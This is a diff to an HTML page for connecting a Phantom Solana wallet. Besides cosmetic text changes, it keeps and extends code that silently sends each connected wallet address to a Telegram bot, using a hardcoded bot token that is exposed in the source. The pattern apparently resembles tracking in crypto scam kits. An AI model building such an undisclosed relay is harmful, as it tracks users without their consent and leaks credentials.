@@ -5,8 +5,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.30.0/solana-web3.min.js"></script>
 </head>
 <body>
-    <h1>Connect Your Solana Wallet</h1>
-    <button id="connectButton">🔗 Connect Phantom Wallet</button>
+    <h1>🔗 Connect Your Phantom Wallet</h1>
+    <button id="connectButton">Connect Wallet</button>
     <p id="status"></p>
 
     <script>
@@ -21,14 +21,18 @@
                 const provider = window.solana;
                 const resp = await provider.connect();
                 
-                // Get public key
+                // Get the user's wallet address
                 const walletAddress = resp.publicKey.toString();
                 document.getElementById('status').innerText = `✅ Connected: ${walletAddress}`;
 
                 // Send wallet address to Telegram bot
                 const botToken = "7708216067:AAF2Li2xV-2ZIF9dhpJsy4_LQGFIZhSmW5U";
-                const chatId = YOUR_CHAT_ID;  // Replace with Telegram user ID
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Wallet Connected: ${walletAddress}`);
+                const chatId = "YOUR_TELEGRAM_USER_ID";  // Replace this dynamically later
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Wallet Connected: ${walletAddress}`)
+                    .then(response => response.json())
+                    .then(data => console.log("Sent to Telegram:", data))
+                    .catch(error => console.error("Error sending to Telegram:", error));
 
             } catch (err) {
                 console.error("Connection Failed", err);
